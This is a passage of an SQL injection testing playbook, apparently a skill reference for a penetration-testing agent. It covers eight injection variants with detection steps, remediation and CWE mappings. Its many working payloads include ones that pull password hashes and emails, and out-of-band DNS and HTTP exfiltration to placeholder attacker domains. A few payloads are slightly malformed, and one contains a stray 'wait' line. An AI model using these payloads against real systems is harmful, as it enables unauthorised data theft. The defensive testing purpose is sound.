# sqli-testing — Variants 1-8 (references/variants-1.md)

Deep playbook for the exfiltration matrix, first half. Read §4 of `SKILL.md` for the
verification standard before claiming any of these as findings. Payload templates,
encoders, and tool flags live in `payloads.md`. Never run destructive or DoS-shaped
payloads against third-party targets — prove impact with read-only extraction or an
oracle.

## Table of contents

- [V-01: Database schema extraction via error-based SQL injection engines](#v-01-database-schema-extraction-via-error-based-sql-injection-engines)
- [V-02: Cross-table arbitrary data retrieval via union-based SQL injection compilation](#v-02-cross-table-arbitrary-data-retrieval-via-union-based-sql-injection-compilation)
- [V-03: Inferential data exfiltration via boolean-based blind SQL inferences](#v-03-inferential-data-exfiltration-via-boolean-based-blind-sql-inferences)
- [V-04: Asynchronous database delay evaluation via time-based blind SQLi conditions](#v-04-asynchronous-database-delay-evaluation-via-time-based-blind-sqli-conditions)
- [V-05: Out-of-band data exfiltration via DNS logging protocols](#v-05-out-of-band-data-exfiltration-via-dns-logging-protocols)
- [V-06: Multi-stage query execution via stacked command separators](#v-06-multi-stage-query-execution-via-stacked-command-separators)
- [V-07: Downstream persistence exploitation via second-order SQL injection pipelines](#v-07-downstream-persistence-exploitation-via-second-order-sql-injection-pipelines)
- [V-08: Transport-layer bypasses via JSON, XML and GraphQL embedded parametric SQLi](#v-08-transport-layer-bypasses-via-json-xml-and-graphql-embedded-parametric-sqli)

---

## V-01: Database schema extraction via error-based SQL injection engines

**Mechanism:** The database itself renders query results inside its error message, so
a failing subquery still echoes data. The injector abuses functions that throw the
value verbatim: MySQL `EXTRACTVALUE`/`UPDATEXML`, Postgres `CAST(... AS int)` or
`1/0` + `|` literals, Oracle `CTXSYS.DRITHSX.SN` / `UTL_INADDR`, MSSQL conversion
errors. The violated assumption: "errors are never shown to users" — but the DBMS
error string is interpolated into the framework's error page.

**Preconditions:**
- Error messages (or an error oracle like status 500 with differing bodies) reach the client; verbose mode, stack traces, or a debug page enabled.
- Injected value flows into an expression the DBMS evaluates eagerly (not a prepared-statement placeholder).
- DBMS fingerprinted (from the error text) so the right function is used.

**Detect:**
1. Send a single `'` and a double `"` — capture raw bodies. MySQL → `You have an error in your SQL syntax`; MSSQL → `Unclosed quotation mark` / `ODBC`; Postgres → `unterminated string` at/` syntax error; Oracle → `ORA-01756` / `ORA-00933`; SQLite → `near "...": syntax error`. Fingerprint first, always.
2. Probe an arithmetic oracle: inject `' AND 1=CAST((SELECT 1) AS INT)-- ` (Postgres/MSSQL) or `EXTRACTVALUE(1,CONCAT(0x7e,(SELECT 1)))` (MySQL). A *different* error than the baseline syntax error means you are in an evaluated context.
3. Confirm the engine reflects expressions: try `' AND 1=CAST('123abc' AS INT)-- ` — error should mention `123abc`.
4. Escalate one level: replace `123abc` with a subquery over `information_schema.tables` (MySQL/MSSQL), `pg_catalog.pg_tables` (Postgres), `all_tables` (Oracle), `sqlite_master` (SQLite).

**Proof of concept:**
- MySQL: `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))-- `
- Postgres: `' AND 1=CAST((SELECT tablename FROM pg_catalog.pg_tables LIMIT 1) AS INT)-- `
- Oracle: `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM all_tables WHERE ROWNUM=1))-- `
- MSSQL: `' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sys.objects))-- `
- SQLite: `' AND load_extension(1)-- ` or `AND CAST(sql AS INT)` against `sqlite_master`.

**Confirm:** Errors render *only* when the subquery result fits the error-message
format — run the same payload with a known-false condition (e.g. `WHERE 1=0`) and
watch the error disappear. That differential proves the error is query-driven, not a
static error page. Cross-check with a boolean flip (V-03) on the same parameter.

**False positives:** Generic framework 500s on any malformed input; WAF block pages
that echo part of the payload; verbose errors from a *different* layer (JSON parser)
that coincidentally contain your string; `EXTRACTVALUE` errors that fire from
XPath-literal parsing rather than your subquery. Juniors also misattribute — an
error page quoting the URL back does not mean SQL echoed your data. Check the
reflected fragment actually comes from the DBMS (engine-specific error code in it).

**Impact:** Unauthenticated or low-priv attacker enumerates table/column names, then
row data, directly from error messages — one request per chunk (errors truncate
~32 chars, so `MID`/`SUBSTRING` in 32-byte windows). Reportable as full schema + data
extraction; note auth level and rate (no special tooling needed to weaponize).

**Remediation:** Parameterized queries (never string-built SQL) plus generic error
handling — return a correlation ID to the user, log the full DB error server-side.

**CWE / OWASP:** CWE-89, CWE-209 (Information Exposure Through an Error Message) — OWASP A03:2021; WSTG-ERR-01 + WSTG-INP-04.

---

## V-02: Cross-table arbitrary data retrieval via union-based SQL injection compilation

**Mechanism:** The attacker appends a `UNION SELECT` whose column count and types
match the original SELECT, so the DBMS returns attacker-chosen rows in the legitimate
result channel (a product list, a profile page). The violated assumption: the result
set's shape is fixed by the application's own query — but a string-concatenated
`WHERE` lets the attacker add a whole second query result.

**Preconditions:**
- Injected input is inside a `SELECT`-shaped query (search, listing, report) — not a write or a `WHERE`-only lookup against a single expected row.
- The query result is rendered to the response (multiple rows visible: list pages, exports).
- No strict prepared-statement placeholder for the injected slot; attacker can add operators (`ORDER BY`-style probing works here too).
- Column count/type must be discoverable — a smaller obstacle than most people think.

**Detect:**
1. Baseline: capture the normal response for a benign input (row count, layout).
2. Find column count with `ORDER BY n` (V-09): increment n until the error/blank page — n-1 is the column count. (Union can use the same trick: `' ORDER BY 10-- ` → error.)
3. Locate a string-displayable column: `' UNION SELECT 1,2,3-- ` → which number appears in the rendered field?
4. Null-fill the rest if types conflict: `' UNION SELECT 1,NULL,3-- ` — if columns are typed (Oracle requires exact types), cast: `' UNION SELECT 'a','b','c' FROM dual-- `.
5. Confirm the union channel with a constant: replace the found index with `'pwned'||version()-- ` or `@@version`.

**Proof of concept:**
- Generic: `<BASELINE>' UNION ALL SELECT NULL,<index>,NULL FROM <table> WHERE '<x>'='<x>`
- MySQL, extract emails via the found display column:
  `' UNION ALL SELECT NULL,email,NULL FROM users WHERE '1'='1`
- Bypass login-style `WHERE` (pair with V-03 for a real login test on your own account):
  `' UNION SELECT 1,'admin','x'-- ` against `SELECT id,role,pw FROM accounts WHERE name='<in>'`.
- Cross-table pivot (the "cross-table" part): `' UNION SELECT table_name,column_name,NULL FROM information_schema.columns WHERE table_schema=database()-- `.

**Confirm:** The union row appears where the application's own rows would appear,
*and* disappears when the union is made false (`AND 1=2`). Two signals: presence
toggle + a value only your query can produce (e.g. `version()` string not present
anywhere else in the app).

**False positives:** The "leaked" value already exists on the page (search echo);
numeric indices rendering as normal row data from an unrelated feature; WAF/CDN
normalizing `UNION` so what you saw was the baseline; counting columns with `ORDER
BY` but the error coming from a WAF, giving the wrong count; multi-row pagination
hiding your injected row (check page 2, change `LIMIT`). Also: `UNION` needs the
same column count *of the outermost SELECT* — subqueries inside one column don't add
columns; juniors over-count here.

**Impact:** Direct, tool-friendly exfiltration: any table reachable by the DB user,
one request per row (batch with `GROUP_CONCAT`/`string_agg`/`LISTAGG` to speed it).
State auth level and whether it's unauthenticated (drives severity to high/critical).

**Remediation:** Parameterized statements for every interpolated slot; deny `UNION`
by construction (placeholders make appended SQL literal data, not syntax).

**CWE / OWASP:** CWE-89 — OWASP A03:2021; WSTG-INP-04.

---

## V-03: Inferential data exfiltration via boolean-based blind SQL inferences

**Mechanism:** The query's *outcome* (true vs false) is observable — content, length,
HTTP status, redirect, "no results" banner — even though no data is ever returned
directly. The attacker turns the page into a 1-bit oracle and extracts strings one
condition at a time: `AND SUBSTRING((SELECT ...),n,1)='a'`. The violated assumption:
"hiding errors and returning generic pages prevents extraction" — inference needs
only a stable difference between true and false.

**Preconditions:**
- A boolean context exists: attacker condition can be combined with the original `WHERE`/`HAVING` (`AND 1=1` fits inside the query).
- The response differs *reliably* between true and false (row count, message, length) — and the difference is not randomized (nonce, CSRF, timestamp, ad slot).
- Auth/session state stable across many requests (blind extraction is chatty: budget requests, be polite).

**Detect:**
1. Differential probe: send `' AND 1=1-- ` and `' AND 1=2-- ` (and the unquoted int version `AND 1=1` / `AND 1=2` if numeric context). Compare status, length, and visible content.
2. Control for noise: repeat each 3-5×. A real oracle is deterministic; if lengths jitter ±N for both, subtract the noise by comparing *content* (row presence) instead.
3. Sanity-check the condition is yours: `' AND 'a'='a` vs `' AND 'a'='b` should flip the same way. Then `' AND (SELECT 1 FROM dual)=1`-style engine-appropriate dual check.
4. Move to data: `' AND SUBSTR((SELECT user FROM session LIMIT 1),1,1)='a'-- ` and binary-search the charset.
5. Control query: always run the negated form — if true-flip and false-flip both "succeed", the page is lying (see False positives).

**Proof of concept:**
- Truth flip (probe): `' AND 1=1-- ` vs `' AND 1=2-- `
- String extraction window: `AND ASCII(SUBSTR(<subquery>,<offset>,1))><mid>` (binary search: ~7 requests/char for a 95-char ASCII range)
- Time-free version on a paginated listing: `' AND (SELECT LENGTH(email) FROM users WHERE id=1)>5-- ` → row present vs "0 results".
- Hidden-parameter abuse: only exploit rows you own (`WHERE id=<your-session's-row>`) when proving impact.

**Confirm:** Two independent confirmations: (a) the same 1-bit flip reproduces 3/3
times with a *different* payload family (operator change: `>` → `LIKE 'a%'`), and
(b) the extracted value matches ground truth you already know (your own password's
first char, a value shown elsewhere in the UI). Ground-truth match kills FP reports.

**False positives:** Dynamic page length from anti-CSRF tokens, timestamps, random
ad/banner content, rate-limit counters; caching that returns one cached variant;
WAF "safe" pages that differ per payload shape (not per condition truth); `ORDER BY`
index changing row *order* but not presence — testers misread ordering as a boolean
signal; and `AND 1=1` "working" because it simply doesn't break a tolerant parser.
The classic: comparing `' AND 1=1` against the *uninjected* baseline instead of
against `' AND 1=2`. Always compare the pair, never baseline vs payload. And on
server-rendered pages (Next.js/RSC, any ad- or token-bearing SSR), *identical* requests
routinely differ by ~1 KB — a single pair means nothing. Run each pair 2-3 times and
require a stable, repeating differential; "sizes differ by 18 bytes" is noise until it
reproduces (real signal from a 2026-10 engagement: 7 probes, all within baseline variance,
zero DB error strings → correctly ruled out).

**Impact:** Slow but total: every column readable one bit at a time; report request
counts (~7×length per string) so triage sees the practical data-rate; mention
unauthenticated vs authenticated.

**Remediation:** Parameterized queries; if dynamic filtering is unavoidable, bind
values and keep attacker conditions out of the SQL string entirely.

**CWE / OWASP:** CWE-89 — OWASP A03:2021; WSTG-INP-04.

---

## V-04: Asynchronous database delay evaluation via time-based blind SQLi conditions

**Mechanism:** The attacker forces the database to *pause* conditionally, using the
response latency as the oracle — `SLEEP(n)` (MySQL/MariaDB), `WAITFOR DELAY`
(MSSQL), `pg_sleep(n)` (Postgres), `DBMS_PIPE.RECEIVE_MESSAGE` (Oracle),
`randomblob`/recursive CTE for SQLite. Works even when the response body is
identical, errors are suppressed, and no row is rendered: time is the channel.

**Preconditions:**
- Injected condition reaches a query that runs *synchronously* in the request path (async jobs, cached reads, and CDN-fronted GETs break the oracle).
- The DBMS supports a delay primitive reachable from the injected context (`IF`/`CASE` wrappers for conditional delay).
- Network baseline measurable: known jitter, load balancer variance, and server-side timeouts matter.

**Detect:**
1. Measure baseline: 5 requests, record mean and stddev of total time for the *unmodified* request. You need a stable baseline (e.g. 120ms ±15) before anything.
2. Unconditional delay: MySQL `/' OR SLEEP(3)-- ` (in `WHERE` context), Postgres `'; SELECT pg_sleep(3)-- `, MSSQL `'; WAITFOR DELAY '0:0:3'-- `, Oracle `'+UTL_INADDR... ` or `CASE WHEN ... THEN DBMS_PIPE.RECEIVE_MESSAGE('a',3) END`.
3. **Differential confirmation, not fixed sleeps:** send `AND IF(1=1,SLEEP(3),0)` and `AND IF(1=2,SLEEP(3),0)`. Only the true branch may delay. A payload that delays both ways is useless (server-side parse cost, WAF, or unconditional sleep).
4. Repeat each branch ≥3× and compare distributions, not single samples. Confirm when true-branch mean ≫ false-branch mean with non-overlapping ranges (e.g. true 3.0-3.4s vs false 0.1-0.2s).
5. Prove conditionality of the *data*: `AND IF(ASCII(SUBSTR((SELECT ...),1,1))>64,SLEEP(3),0)` — flip the comparison and watch the delay move.

**Proof of concept:**
- MySQL conditional: `' AND IF(ASCII(SUBSTR(<subquery>,<offset>,1))=<code>,SLEEP(3),0)-- `
- Postgres: `'; SELECT CASE WHEN (ASCII(SUBSTR((SELECT current_user),1,1))=97) THEN pg_sleep(3) ELSE pg_sleep(0) END-- `
- MSSQL: `'; IF (ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.tables),1,1))=97) WAITFOR DELAY '0:0:3'-- `
- Oracle: `' AND CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',3) ELSE 0 END=1-- `
- Keep delays 1-3s; never loop sleeps in a script against third-party targets (that's a self-inflicted DoS).

**Confirm:** Differential timing (V-04's own rule): true branch delayed, false branch
not, 3/3 runs, plus a second signal — combine with a boolean body difference where
available, or reproduce with a different delay primitive (`pg_sleep` → `|| '...'`
heavy-query timing only as a last resort and only if read-cheap). Report the timing
table (samples, means) as evidence.

**False positives:** Network variance and target load (never trust one sample);
server-side statement timeouts that cap long sleeps so true/false both look equal;
CDN or WAF delaying *based on payload shape* (this is the killer — a WAF scanning
`SLEEP(3)` takes time regardless of condition, so both branches delay → your
differential must compare true vs false of the *same shaped* payload);
connection-pool saturation adding seconds at random; `SLEEP` in a query that runs
per-row multiplying delay — that's real but makes the oracle crude (normalize by
row count or target `LIMIT 1` contexts). Juniors also accept "it felt slow".

**Impact:** Full blind extraction without content: same data-rate math as V-03 plus
the ability to work where *only* timing survives (API-only, no error page, no
rendered rows). Mention request volume and sleep duration — triage needs to know
you didn't hammer their server.

**Remediation:** Parameterized queries (delay lives in code, not in attacker SQL);
keep WAFs from being the only control; monitor for repeated conditional-latency
patterns as detection.

**CWE / OWASP:** CWE-89 (+ CWE-400 consideration if delays were abused) — OWASP A03:2021; WSTG-INP-04.

---

## V-05: Out-of-band data exfiltration via DNS logging protocols (OOB SQLi / DNSlog frameworks)

**Mechanism:** The DBMS resolves or fetches an attacker-controlled domain during
query evaluation, turning the network stack into a side channel that carries *data*
(not just a bit): `LOAD_FILE(CONCAT('\\\\',<value>,'.<your-id>.dnslog.cn\\x'))`
(MySQL), `utl_http.request` (Oracle), `xp_dirtree`/`OPENROWSET` (MSSQL),
`dblink`/`COPY`-adjacent resolution (Postgres via `http` ext or
`CITEXT`-style crafted hosts), SQLite `load_extension` over UNC. DNS labels can
encode extracted bytes — one request can exfiltrate a whole string chunk. The
assumption violated: "the DB can't talk to the internet."

**Preconditions:**
- Outbound DNS (or HTTP) from the DB server to the internet — many hardened prod DBs block this; check early, don't assume.
- A logging collaborator: Burp Collaborator, interactsh, OASTify, DNSlog.cn, custom subdomain of your VPS. Use a *per-test unique* subdomain.
- Privileges: MySQL `FILE` for `LOAD_FILE`; MSSQL `xp_dirtree` reachable; Oracle network packages enabled.

**Detect:**
1. Establish the channel first with a *constant* payload: `' AND LOAD_FILE(CONCAT('\\\\','oast-test-<nonce>.yourdomain.com\\a'))-- ` — no data, just proves egress. Confirm a DNS query at your logger *before* trying data.
2. If no callback: the DB likely has no egress (or `secure_file_priv`/`local_infile` blocks). Fall back to V-03/V-04 — do not keep re-firing.
3. Once constants callback, test data-carrying: point the host at `version()` output encoded in labels (hex → valid label chars `0-9a-f`).
4. Verify determinism: same payload twice → two identical queries at the logger; altered condition → no query (conditional OOB).
5. Record request→callback pairing (timestamp correlation) as evidence.

**Proof of concept:**
- MySQL DNS exfil: `' AND IF(SUBSTR(<subquery>,1,1)='a',LOAD_FILE(CONCAT('\\\\',HEX(SUBSTR(<subquery>,1,8)),'.<nonce>.yourdomain.com\\x')),0)-- `
- MSSQL: `'; DECLARE @d NVARCHAR(255); SET @d=(SELECT TOP 1 name FROM sys.tables); EXEC('master..xp_dirtree \\\\'+@d+'.<nonce>.yourdomain.com\\a')-- `
- Oracle: `' AND UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.<nonce>.yourdomain.com/') IS NOT NULL-- ` (or `DBMS_LDAP` / external tables).
- Postgres: `COPY`-free variant using `dblink`/`http` extension where present; otherwise use timing (V-04).
- HTTP OOB (when DNS-only is unavailable): blind SSRF-flavored callback to your HTTP logger — chain notes in `payloads.md` §6.

**Confirm:** Callback arrives at *your* logger with your nonce, tied to a request you
sent (timestamp + unique subdomain per payload), and stops when the condition is
false. One callback proves OOB channel; data carried in labels matching ground
truth (your own username) proves *exfiltration*.

**False positives:** Your own earlier probe's DNS still resolving (caching — always
use fresh nonces); scanners/bots that resolve any subdomain you mention (interactsh
distinguishes your request correlation, use it); wildcard DNS on your domain
answering everything (verify with a random label that never appears in a payload);
callback from the *client's* browser (e.g. if payload reflects into an `<img>` —
check the query source IP is the *server's*, not yours); and assuming "callback seen
= data extracted" when it was the constant probe. 

**Impact:** Covert, chunked exfiltration that bypasses response-side controls —
useful when the app filters output but not DB-side resolution; report egress
capability + auth level; explicitly note no destructive commands were run.

**Remediation:** Parameterize; egress-filter DB servers; disable `FILE`/network
packages for the app's DB role; alert on DNS queries to non-allowlisted domains from
DB hosts.

**CWE / OWASP:** CWE-89, CWE-918 adjacency (SSRF-like DB egress) — OWASP A03:2021; WSTG-INP-04.

---

## V-06: Multi-stage query execution via stacked command separators and batch execution

**Mechanism:** The attacker terminates the original statement with `;` and appends a
second statement executed by the same driver — turning a read-only sink into
anything the driver allows (a `SELECT` for data, or a DDL/DML command when allowed).
Stacked capability changes the game: it enables second-order writes (V-07),
`INTO OUTFILE` staging (V-10), and multi-stage payloads. The violated assumption:
"one input = one statement" — true for strict prepared-statement drivers, false for
multi-statement connectors (OLE DB/ODBC with MARS, mysqli with `multi_query`,
psycopg `execute` with `;`, JDBC allowMultiQueries).

**Preconditions:**
- The driver/API allows multi-statement execution (`allowMultiQueries=true`, `PDO::MYSQL_ATTR_MULTI_STATEMENTS`, `MARS`, psycopg2 default, JDBC URL flag).
- Semicolons reach the query unfiltered (WAF may strip `;` — bypass in V-11).
- The second statement is executed synchronously in the same request (no splitting across connections).

**Detect:**
1. Harmless stack probe: `'; SELECT 'stacked_probe_12345'-- ` (string context) or `1;SELECT 12345` (numeric). Look for the second statement's output, or any behavior change.
2. Probe *side-effect-free* second statements first: `'; SELECT SLEEP(2)-- ` → a 2s delay proves two statements ran even if output is discarded. Differential: baseline vs `;`-payload timing (V-04 method).
3. Error differentiation: `'; SELECT 1 FROM nonexistent_tbl-- ` should produce a *different* error (missing table) than the baseline syntax error — the error proves the second statement parsed.
4. If `;` is stripped but `;/**/` or `%3b` works, note the bypass for V-11.
5. Check whether the app surfaces batch output (some return only the last statement's rows — juniors think the stack "failed" when it actually executed silently).

**Proof of concept:**
- Read-only stack (preferred proof): `'; SELECT table_name FROM information_schema.tables WHERE table_schema=database()-- `
- Conditional-delay stack: `'; SELECT CASE WHEN <condition> THEN SLEEP(2) ELSE 0 END-- `
- Identifier stack for schema work: `'; SELECT version();-- ` (MySQL `-- ` needs trailing space; MSSQL `;--` fine).
- **Do not** run `'; DROP TABLE ...` or `'; UPDATE ...` against third-party targets to "prove" stacking. Prove it with a second `SELECT` or a conditional delay — read-only evidence is just as convincing to triage and far safer.

**Confirm:** Two signals: (a) the second statement's *distinct* effect (its output
value, its specific error, or its conditional delay) attributable only to a
successfully executed second statement, and (b) absence of the effect when the `;`
is removed or the second statement is made false. That A/B is the proof.

**False positives:** WAF/sanitizer echoes of the injected text (looks like second
output but is reflection); a `;`-bearing payload changing the *first* statement's
parse so the app falls back to an error page with 200-ish content; JSON bodies where
`;` is literal data (V-08 context — the "stack" never reached SQL); and ODBC drivers
that execute only the first statement — a `SLEEP` in statement 2 not delaying is
*inconclusive*, not proof of failure. Also: some DBs (Postgres protocol) natively
multi-statement while others (SQLite through some wrappers) do not — engine check.

**Impact:** Escalates severity: read-anything (stacked `SELECT`), and where writes
are reachable, defacement/logic-bypass via `UPDATE`-shaped payloads *only in
authorized labs*; report the capability with read-only proof and note the write
potential in Impact.

**Remediation:** Prepared statements (they cannot stack); disable
`allowMultiQueries`/MARS where not needed; parameterize rather than filter `;`.

**CWE / OWASP:** CWE-89 — OWASP A03:2021; WSTG-INP-04.

---

## V-07: Downstream persistence exploitation via second-order SQL injection pipelines

**Mechanism:** Input stored verbatim at write time (no injection possible yet —
`INSERT` used a placeholder), then *re-used inside a string-built query later* —
when an admin views the list, a report runs, a search executes, or a login checks
credentials. The injection is deferred: the attacker plants SQL as *data* in a
trusted field, and the application's own later query promotes it to syntax. The
violated assumption: "we parameterized the INSERT, so we're safe" — the SELECT that
consumes the field forgot to.

**Preconditions:**
- A write path stores attacker text unchanged (profile, ticket title, address, referral code, filename, webhook name).
- A read/action path later concatenates that stored value into SQL — find it by tracing where the field is displayed, filtered, sorted, or exported.
- The consuming query is attacker-influenced *indirectly* — timing is your friend: trigger the sink explicitly (visit the admin list, trigger the report) rather than waiting.

**Detect:**
1. Inventory stored fields: register/update flows with text inputs (name, bio, company, tag). Plant a *safe marker* first: `sqli-test-'-<nonce>` — remember it.
2. Search the app for where that marker is re-used: pages that display it, exports, "similar users" search, notifications, admin views, sorting by that column, or API responses that include a derived filter.
3. Watch for the planted quote to *break* the consumer: a 500, a missing row, a truncated display — that's the classic second-order symptom ("my name broke the admin page").
4. Escalate with a boolean in the stored field: name = `' AND '1'='1` vs `' AND '1'='2` — then observe whether the consuming page's row set changes when *it* runs.
5. Time-based variant (when the consumer is hard to see): store `' AND SLEEP(3)-- ` in a candidate field, then trigger the consumer; delay on trigger = confirmed pipeline.

**Proof of concept:**
- Plant (write, benign): `PUT /api/profile {"displayName": "bob'||'"} ` — wait, plant full payload:
  `{"displayName": "' OR '1'='1"-- "}` (stored via parameterized INSERT).
- Trigger: `GET /admin/users/list` (or any consumer) → consumer builds
  `SELECT * FROM users WHERE display_name='<stored>'` → injection fires.
- Data extraction via plant: store
  `' UNION SELECT email,password_hash FROM users WHERE '1'='1` in the field the consumer renders, then trigger and read the consumer's output.
- Time variant: store `x' AND IF(ASCII(SUBSTR((SELECT ...),1,1))=97,SLEEP(2),0)-- ` then trigger; measure on trigger (differential — see V-04).

**Confirm:** Two-stage reproduction: (1) same stored payload triggered from the
consumer endpoint 3/3 times yields the effect, (2) changing *only* the stored value
(changes the condition truth) changes the consumer's behavior — the effect tracks
the *data*, not the write request. That temporal separation is the second signal.

**False positives:** Reflected injection masquerading as second-order (payload
echoed *directly* by the write response — test by triggering the consumer from a
*different* session/page); self-inflicted XSS instead of SQLi (script tag in your
name breaks the admin page — check the breakage is SQL-shaped: engine error, row
count change); stored XSS being reported as injection; input-length truncation
choking your payload so the "second-order" never actually contained SQL (V-14
interference); and consumers that *sanitize on display* producing false negatives.
Junior trap: triggering from the same session you wrote in can hit a cache — use a
fresh session for the consumer.

**Impact:** Often higher severity than first-order: the injection lands in
privileged/admin contexts (the consumer is usually an admin dashboard or nightly
report run with a high-priv DB role), fires without the attacker's session, and can
corrupt *other users'* views. Report the full write→store→trigger chain with both
request/response pairs.

**Remediation:** Parameterize the *consuming* query too — every re-use of stored
data needs its own binding; treat stored strings as untrusted forever, not just at
insert time.

**CWE / OWASP:** CWE-89 (second-order variant; often called "stored SQL injection") — OWASP A03:2021; WSTG-INP-04.

---

## V-08: Transport-layer bypasses via JSON, XML and GraphQL embedded parametric SQLi

**Mechanism:** The injectable value is wrapped in a structured transport — JSON body
(`{"id": "1' OR '1'='1"}`), XML (`<filter>1' OR '1'='1</filter>`, XXE-adjacent but
SQL-facing), GraphQL (`variables`, `input` objects, aliases) — and the server
deserializes it before concatenating into SQL. Layers shield the payload from naive
WAFs that only inspect query strings, and change *where* the quote must break out of
(the JSON string, the XML text node, the GraphQL literal). The violated assumption:
"body payloads are safe because they're parsed, not built" — parsing happens before
SQL assembly; the parsed *value* is still attacker text.

**Preconditions:**
- The value inside the structured container reaches a string-concatenated SQL sink (V-01/V-02/V-03 mechanisms all apply once inside).
- Transport parsing is attacker-influencable: content-type sniffing (`Content-Type: application/json` with form body), JSON type confusion (`{"id": {"$gt": ""}}` — V-13), XML entity expansion off the SQL path.
- GraphQL resolvers often map input directly to ORM filters → high-value targets.

**Detect:**
1. Identify transport: `Content-Type` + body shape. Then probe *inside* the container: JSON `{"q": "'}` (quote inside the value, not the raw body), XML `<q>'</q>`, GraphQL `{"query":"query($q:String){ search(q:$q){ id } }","variables":{"q":"'"}}`.
2. Type-confusion probe (JSON): send `{"q": {"x": 1}}` where a string was expected. Different error (parser vs SQL) tells you whether the deserializer or the query layer rejects it.
3. Escalate the inner value: `{"q": "' AND 1=1-- "}` → boolean flip in the GraphQL/REST result set (V-03 method).
4. XML angle: inject inside a *text node*, not an attribute (`<q>'</q>` vs `<q x="'>`); if the parser resolves entities, check whether entity content reaches SQL (rare, but read-side XXE + SQL combos exist).
5. GraphQL-specific: batch aliases (field-name collision abuse only helps BAC — for SQLi keep to value injection), introspection to find filter args, and `variables` (typed `String`/`Int` may coerce — try `String!` with a quote, `Int` with `-1 OR 1=1` to see coercion errors).

**Proof of concept:**
- JSON boolean: `POST /api/search` `{"Content-Type": application/json"}` body:
  `{"filter": "' OR '1'='1'-- "}`
- JSON type-confusion (numeric field): `{"id": "1 OR 1=1"}` and `{"id": ["1"," OR 1=1"]}` (array where scalar expected).
- XML: `<search><term>' UNION SELECT 1,2,3-- </term></search>` (raw body with `application/xml`).
- GraphQL: `{"query":"query($f:String!){ items(filter:$f){ name } }","variables":{"f":"' OR '1'='1'-- "}}`
- Content-type flip: send the JSON body as `application/x-www-form-urlencoded` if the server sniffs — payload may reach a different parser that is less strict.

**Confirm:** The *inner* value alone drives the effect: swap only the value (true →
false condition) while keeping container shape identical and observe the response
flip (V-03) or delay (V-04). Independent second signal: same inner payload works
through a *different* transport (REST JSON and its GraphQL equivalent) — same sink,
two doors.

**False positives:** Parser rejecting malformed JSON/XML *before* SQL (generic 400s
mislabeled as injection); GraphQL field errors unrelated to your value (validation
layer, not DB); JSON `{"$gt":...}` handled by an ORM as an *operator* (that's V-13
NoSQLi, not SQLi — different CWE, report it as NoSQLi); XML parser XXE/network
errors being reported as SQLi; and reflection of the JSON body back in an error
("invalid query at position N" echoing your quote) — echo ≠ execution. Juniors
also forget that a JSON string literal requires escaping internal quotes as `\"`
when the payload itself embeds quotes — the WAF may see a *different* string than
the one the app parses.

**Impact:** Evasion-flavored reachability: reaches sinks that query-string scanners
miss, often on API endpoints with high data density (GraphQL `items(filter:)`,
JSON `filter`/`sort` args); report the transport + sink pair; severity from data
reachable behind auth.

**Remediation:** Parameterize after deserialization (binding applies to parsed
values too); validate/allow-list GraphQL/JSON filter enums server-side; never pass
raw transport strings into query builders.

**CWE / OWASP:** CWE-89 (structured transports don't change the sink) — OWASP A03:2021; WSTG-INP-04 (+ WSTG-ERR-03/XXE adjacency where XML is parsed).
